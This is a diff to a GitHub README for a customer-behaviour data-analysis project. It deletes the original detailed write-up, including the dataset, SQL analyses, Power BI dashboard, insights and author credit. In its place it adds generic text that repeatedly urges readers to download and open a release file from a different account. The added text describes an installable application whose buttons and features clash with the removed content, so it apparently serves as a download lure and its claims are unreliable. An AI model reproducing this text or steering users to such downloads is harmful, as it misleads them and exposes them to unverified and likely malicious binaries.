@@ -1,156 +1,69 @@
-🛍️ Customer Shopping Behavior Analysis
-📄 Project Overview
+# 📊 Customer_behavior_analysis - Understand Your Customers Better
 
-This project analyzes customer shopping behavior using transactional data from 3,900 purchases across multiple product categories.
-The goal is to uncover insights into spending patterns, customer segments, product preferences, and subscription behavior to guide data-driven business decisions.
+## 🌟 Overview
+Customer_behavior_analysis is a data analytics project designed to help businesses understand customer behavior. Using Python, SQL, and Power BI, this project provides insights into how customers interact with products and services. You can leverage these insights to improve customer satisfaction and boost sales.
 
-🧰 Tools & Technologies Used
-Category	Tools
-Data Analysis	Python (Pandas, NumPy, Matplotlib, Seaborn)
-Database & SQL	MySQL (Data storage, queries, joins, aggregation)
-Business Intelligence	Power BI (Interactive dashboards, KPIs, visuals)
-Version Control	Git & GitHub
-Data Cleaning & Transformation	Power Query, Python
-📊 Dataset Summary
+## 🔗 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Pearlinedigestive190/Customer_behavior_analysis/releases)
 
-Total Rows: 3,900
+## 🚀 Getting Started
 
-Total Columns: 18
+### 1. What You Need
+Before downloading the software, ensure your computer meets these basic requirements:
 
-Key Features:
+- **Operating System:** Windows 10, macOS, or Linux
+- **Storage Space:** At least 500 MB free
+- **Internet Connection:** Required for downloading files and updating
+- **Software Dependencies:** 
+  - Python 3.x
+  - SQL database (MySQL or PostgreSQL)
+  - Power BI (for visualization)
 
-Customer Demographics: Age, Gender, Location, Subscription Status
+### 2. Download & Install
+To start using Customer_behavior_analysis, visit the [Releases page](https://github.com/Pearlinedigestive190/Customer_behavior_analysis/releases) to download the latest version.
 
-Purchase Details: Item Purchased, Category, Purchase Amount, Season, Size, Color
+1. Click the link to go to the Releases page.
+2. Look for the latest version. It will be at the top of the list.
+3. Click on the desired version.
+4. Download the file suitable for your operating system.
+5. Open the downloaded file and follow the on-screen instructions.
 
-Shopping Behavior: Discount Applied, Promo Code Used, Frequency of Purchases, Review Rating, Shipping Type
+### 3. Project Features
+- **Data Analysis:** Analyze customer data using Python libraries like NumPy and Pandas.
+- **Database Integration:** Utilize MySQL or PostgreSQL for data storage and retrieval.
+- **Reports in Power BI:** Create interactive reports for better insights.
+- **Visualization Tools:** Use charts and graphs to represent data visually.
 
-🧮 Data Analysis Workflow
-1. Data Preparation (Python)
+### 4. Basic Usage Instructions
+Once you have installed the software, follow these steps to start analyzing customer behavior:
 
-Imported dataset using pandas
+1. **Open the Application:** Find the Customer_behavior_analysis application in your programs list and open it.
+2. **Load Your Data:** Choose the data file you want to analyze. Supported formats include CSV and Excel.
+3. **Run Analysis:** Select the analysis options you want to apply. The application will process the data and present results.
+4. **Generate Reports:** Choose to create an interactive report in Power BI for further exploration.
 
-Checked structure and summary statistics using df.info() and df.describe()
+### 5. Common Tasks
+Here is a quick guide to help you perform common tasks:
 
-Handled missing data (37 nulls in review_rating) using median imputation per category
+- **Importing Data:** Click on the “Import” button and browse for your data file.
+- **Running Analysis:** Select your analysis criteria from the menu and click “Run.”
+- **Exporting Reports:** Use the “Export” option to save your analysis results as a PDF or Excel file.
 
-Standardized column names to snake_case for readability
+### 6. FAQ
+**Q: What if I run into issues during installation?**
 
-Feature Engineering:
+A: Ensure that you have the correct version for your operating system. Check that your system meets the requirements listed above. If problems persist, visit the Issues section on our repository page.
 
-age_group — binned customer ages
+**Q: Can I use this software for any type of data?**
 
-purchase_frequency_days — calculated from purchase history
+A: Yes, you can analyze any customer-related data. However, ensure the data is formatted correctly for best results.
 
-Dropped redundant columns (promo_code_used)
+### 7. Community Support
+If you need help or want to share your feedback, please visit the Discussions section of our GitHub page. You can also report issues on our Issues page.
 
-Loaded cleaned data into MySQL for SQL-based analysis
+## 🔗 Additional Resources
+- [Documentation](https://github.com/Pearlinedigestive190/Customer_behavior_analysis/wiki): Explore detailed guides for advanced features.
+- [Examples](https://github.com/Pearlinedigestive190/Customer_behavior_analysis/tree/main/examples): Check out example analyses and reports.
 
-2. SQL Business Analysis
-
-Performed structured SQL queries to uncover business insights:
-
-Analysis	Description
-Revenue by Gender	Compared total revenue from male vs. female customers
-Top 5 Products by Rating	Found products with the highest average review ratings
-Subscribers vs Non-Subscribers	Compared average spend and total revenue
-Shipping Type Comparison	Analyzed purchase amounts between Standard vs Express
-Customer Segmentation	Classified customers into New, Returning, and Loyal
-Discount-Dependent Products	Identified products often bought with discounts
-Top 3 Products per Category	Highlighted top-selling products by category
-Repeat Buyers & Subscriptions	Examined subscription likelihood among repeat buyers
-3. Dashboard in Power BI
-
-An interactive dashboard was created to visualize:
-
-Total Revenue by Age Group
-
-Gender-based Spending Patterns
-
-Subscription Impact on Revenue
-
-Product Ratings and Discount Analysis
-
-Customer Loyalty Segments
-
-Dashboard Components:
-
-Slicers for Category, Age Group, and Subscription Status
-
-Dynamic Charts (Bar, Pie, Donut, and KPI Cards)
-
-DAX Measures for Revenue, Average Rating, and Discount Usage
-
-💡 Key Insights
-
-High-Spending Discount Users: Customers using discounts still spent above average.
-
-Subscribers: Generate higher lifetime revenue than non-subscribers.
-
-Express Shipping: Linked to higher average purchase amounts.
-
-Top Age Group: Middle-aged customers (30–45) contribute the most to total revenue.
-
-Product Ratings: Correlate positively with repeat purchase rates.
-
-🧭 Business Recommendations
-
-Boost Subscriptions – Promote exclusive perks for subscribers.
-
-Targeted Marketing – Focus campaigns on high-revenue age groups.
-
-Product Positioning – Highlight top-rated and best-selling products.
-
-Customer Loyalty Programs – Reward repeat buyers to encourage loyalty.
-
-Review Discount Policy – Balance sales boosts with profit margins.
-
-📂 Project Structure
-Customer-Shopping-Behavior-Analysis/
-│
-├── data/
-│   └── customer_shopping_data.csv
-├── scripts/
-│   ├── data_cleaning.ipynb
-│   ├── sql_queries.sql
-│   └── visualization.pbix
-├── README.md
-└── requirements.txt
-
-🧠 Learning Outcomes
-
-Data Cleaning & Feature Engineering in Python
-
-SQL Querying for Business Insights
-
-Dashboard Design in Power BI
-
-End-to-End Data Pipeline: Python → MySQL → Power BI
-
-🚀 How to Run This Project
-
-Clone the repository
-
-git clone https://github.com/yourusername/Customer-Shopping-Behavior-Analysis.git
-cd Customer-Shopping-Behavior-Analysis
-
-
-Install dependencies
-
-pip install -r requirements.txt
-
-
-Run the analysis notebook
-
-jupyter notebook scripts/data_cleaning.ipynb
-
-
-Import cleaned data to MySQL
-
-Open visualization.pbix in Power BI Desktop to view the dashboard
-
-🧾 Author
-
-Mohammed fayd f
-
-📊 Data Analyst | Python | SQL | Power BI | BI Storytelling
+## 🔗 Download Now Again
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Pearlinedigestive190/Customer_behavior_analysis/releases)
